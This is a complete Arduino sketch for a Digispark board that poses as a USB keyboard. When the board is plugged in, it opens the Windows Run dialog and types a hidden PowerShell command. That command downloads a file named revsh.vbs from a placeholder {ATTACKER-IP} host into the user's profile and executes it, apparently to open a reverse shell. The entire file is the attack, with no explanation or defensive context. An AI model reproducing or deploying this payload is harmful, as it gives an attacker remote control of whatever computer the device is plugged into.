#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('http://{ATTACKER-IP}/revsh.vbs', \\\"$env:UserProfile/revsh.vbs\\\");Start-Process \\\"$env:UserProfile/revsh.vbs\\\" -WorkingDir \\\"$env:UserProfile\\\"\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  exit(0);
}
